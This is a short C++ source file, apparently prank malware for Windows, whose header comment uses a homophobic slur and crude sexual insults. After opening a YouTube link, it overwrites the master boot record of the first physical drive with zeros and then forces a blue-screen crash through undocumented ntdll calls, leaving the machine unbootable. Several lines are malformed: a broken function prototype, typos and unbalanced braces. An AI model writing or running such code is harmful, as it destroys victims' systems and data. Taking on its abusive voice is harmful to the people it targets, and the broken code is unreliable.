//XoredUser's cock and ball torture for windows faggots from 2018
//xoreduser@gmail.com
#include<iostream>
#include <thread> 
#include <chrono>
#include "windows.h"
#define MBR 512
#pragma comment(lib, "ntdll.lib");
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ErrorStatus, ULONG, NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PRT Parameters, ULONG ValidRespnseOption, PULONG Response);
typedef unsigned long ulong;

void initBSOD()
{
BOOLEAN sussy;
ulong resp;
RtlAdjustPrivilege(19, true, false, &sussy);
NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &resp);
}

void initMBR()
{
DWORD cock;
char mbrSuck[MBR];
ZeroMemory(&mbrSuck, (sizeof mbrSuck));
HANDLE MasterBootRecord = CreateFile(L "\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

{
if (WriteFile(MasterBootRecord, mbrSuck, MBR, &cock, NULL) == True)
{
	std::this_thread::sleep_for( std::chrono::milliseconds(2000) );
	initBSOD();
}
else
{
	initBSOD();
}
CloseHandle(MasterBootRecord);
}

int main()
{
    system("start https://youtube.com/watch?v=YSDCNV0RCG0");
    std::this_thread::sleep_for( std::chrono::milliseconds(10000) );
    initMBR();
    return 0;
}